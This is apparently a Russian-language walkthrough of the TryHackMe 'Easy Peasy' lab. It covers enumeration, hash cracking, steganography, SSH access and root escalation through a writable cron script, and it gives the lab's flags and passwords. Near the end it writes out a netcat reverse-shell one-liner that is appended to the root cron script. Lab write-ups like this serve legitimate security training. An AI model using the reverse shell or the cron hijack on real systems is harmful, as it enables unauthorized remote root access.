# Easy Peasy

> Полное прохождение лаборатории. Материал содержит спойлеры и предназначен только для легальной учебной практики.

**Лаборатория:** [открыть комнату на TryHackMe](https://tryhackme.com/room/easypeasyctf)

## Ход работы

Привет! При решении данной машины потренируемся в использовании таких инструментов, как Nmap и Gobuster, получим доступ к уязвимому компьютеру, повысим привилегии с помощью задания cron и найдем все флаги. Начнем!

Начинаем со сканирования Nmap, сразу использую флаг -sV для определения версий сервисов на портах:

```bash
Nmap -sV 10.113.184.238
```

![Скриншот 1](./media/image1.png)

Пытаюсь ответить на первый вопрос «How many ports are open?», что открыт 1 порт, но ответ неверный, поэтому используем флаг -p- и пробуем еще раз:

```bash
Nmap -sV -p- 10.113.184.238
```

![Скриншот 2](./media/image2.png)

- How many ports are open? – 3

- What is the version of nginx? – 1.16.1

- What is running on the highest port? – Apache

Переходим ко второй части и скачиваем прикрепленный файл с паролями easypeasy.txt, он понадобится для дальнейшей работы.

Используя Gobuster, найдем первый флаг. Запустим перечисление директорий:

```bash
gobuster dir -u http://10.113.184.238 -w /usr/share/wordlists/dirb/common.txt
```

![Скриншот 3](./media/image3.png)

```bash
gobuster dir -u http://10.113.184.238 -w /usr/share/wordlists/dirb/big.txt
```

![Скриншот 4](./media/image4.png)

Найдены директория /hidden и файл robots.txt. При переходе на /hidden ничего не обнаружено, в исходном коде страницы тоже ничего интересного.

![Скриншот 5](./media/image5.png)

![Скриншот 6](./media/image6.png)

Перечисляем директории дальше, но уже в /hidden:

```bash
gobuster dir -u http://10.113.184.238/hidden -w /usr/share/wordlists/dirb/common.txt
```

![Скриншот 7](./media/image7.png)

Находим директорию /whatever, переходим по ней и на первый взгляд снова ничего интересного. Но заглянув в исходный код страницы находим интересную строку ZmxhZ3tmMXJzN19mbDRnfQ==, раскодируем ее из формата base64 и получаем первый флаг!

![Скриншот 8](./media/image8.png)

![Скриншот 9](./media/image9.png)

![Скриншот 10](./media/image10.png)

- Using GoBuster, find flag 1 - flag{f1rs7_fl4g}

Пробуем поискать директории по адресу 10.113.184.238/hidden/whatever:

```bash
gobuster dir -u http://10.113.184.238/hidden -w /usr/share/wordlists/dirb/big.txt
```

![Скриншот 11](./media/image11.png)

На порту 80 больше ничего не нашлось. Пробуем веб-сервер Apache на порту 65524:

```bash
gobuster dir -u http://10.113.184.238:65524 -w /usr/share/wordlists/dirb/common.txt
```

![Скриншот 12](./media/image12.png)

Зайдем на robots.txt:

![Скриншот 13](./media/image13.png)

Видим подозрительную строку a18672860d0510e5ab6699730763b250, похоже на хэш, попытаемся расшифровать его онлайн-сервисом [Hashes.com](http://hashes.com).

![Скриншот 14](./media/image14.png)

Мы нашли второй флаг!

- Further enumerate the machine, what is flag 2?  - flag{1m_s3c0nd_fl4g}

Третий флаг я нашел на главной странице сервера Apache на порту 65524 в исходном коде страницы.

![Скриншот 15](./media/image15.png)

- Crack the hash with easypeasy.txt, What is the flag 3?  - flag{9fdafbd64c47471a8f54cd3fc64cd312}

Также в исходном коде обнаружилась такая строка:

![Скриншот 16](./media/image16.png)

Загружаем это значение в CyberChef, раскодируем From base62 и получаем значение новой директории:

![Скриншот 17](./media/image17.png)

- What is the hidden directory?  - /n0th1ng3ls3m4tt3r

Перейдем в найденную директорию /n0th1ng3ls3m4tt3r:

![Скриншот 18](./media/image18.png)

![Скриншот 19](./media/image19.png)

На странице видим фото и интересную строку. При анализе исходного кода страницы видим это же значение, похожее на hash:

![Скриншот 20](./media/image20.png)

Создадим файл с найденным hash в файл hash.txt на свою машину. Пробуем расшифровать hash.txt c помощью John the Ripper и скачанного ранее списка паролей easypeasy.txt:

```bash
john -wordlist=~/Desktop/easypeasy_1596838725703.txt hash.txt
```

![Скриншот 21](./media/image21.png)

John указывает на то, что для расшифровки требуется явно указать –format=gost.

```bash
john -wordlist=~/Desktop/easypeasy_1596838725703.txt -format=gost hash.txt
```

![Скриншот 22](./media/image22.png)

Пароль расшифрован: mypasswordforthatjob

- Using the wordlist that provided to you in this task crack the hash what is the password?  - mypasswordforthatjob

Думая, куда дальше копать, я попробовал сохранить фото с данной страницы на свою машину и проверить его на стеганографию.

![Скриншот 23](./media/image23.png)

![Скриншот 24](./media/image24.png)

Используем steghide, пассфраза та, которую мы расшифровали ранее (mypasswordforthatjob):

```bash
steghide extract -sf binarycodepixabay.jpeg
```

Открываем извлеченный файл secrettext.txt:

![Скриншот 25](./media/image25.png)

Используем CyberChief, чтобы расшифровать бинарный код:

![Скриншот 26](./media/image26.png)

- What is the password to login to the machine via SSH?  - iconvertedmypasswordtobinary

Реквизиты подключения по SSH:

username: boring

password: iconvertedmypasswordtobinary

Попытаемся зайти по SSH с данной парой логин:пароль (не забываем, что порт в данном случае не стандартный 80, а 6498):

![Скриншот 27](./media/image27.png)

Реквизиты верные, доступ получен! В этой же директории находим пользовательский флаг:

![Скриншот 28](./media/image28.png)

Флаг имеет странный вид, снова используем CyberChief с функцией ROT13, чтобы привести его в нормальный вид:

![Скриншот 29](./media/image29.png)

- What is the user flag?  - flag{n0wits33msn0rm4l}

Теперь нам нужно повысить привилегии для получения флага root.

Описание к заданию намекает нам, что следует повысить привилегии с помощью уязвимого задания cron. Откроем файл по адресу /etc/crontab:

![Скриншот 30](./media/image30.png)

Мы видим, что есть скрипт, который запускается от пользователя root каждую минуту.

Взглянем на этот файл:

![Скриншот 31](./media/image31.png)

![Скриншот 32](./media/image32.png)

Добавим в конец данного файла обратную оболочку PentestMonkey, не забудем указать ip-адрес нашей машины:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

![Скриншот 33](./media/image33.png)

Теперь запустим на нашей машине слушатель nc и будем ожидать соединения. Через минуту скрипт отработал и соединение было установлено. Мы успешно повысили привилегии и теперь мы root. Также я использовал команду «python3 -c 'import pty; pty.spawn("/bin/bash")'» для установки оболочки bash c tty:

![Скриншот 34](./media/image34.png)

Теперь приступим к поиску root флага. Он нашелся в домашней папке root, но был скрытым. Для просмотра скрытых файлов в данной папке используем команду ls с ключами -la:

![Скриншот 35](./media/image35.png)

- What is the root flag?  - flag{63a9f0ea7bb98050796b649e85481845}

Мы нашли все флаги и завершили прохождение машины Easy Peasy!
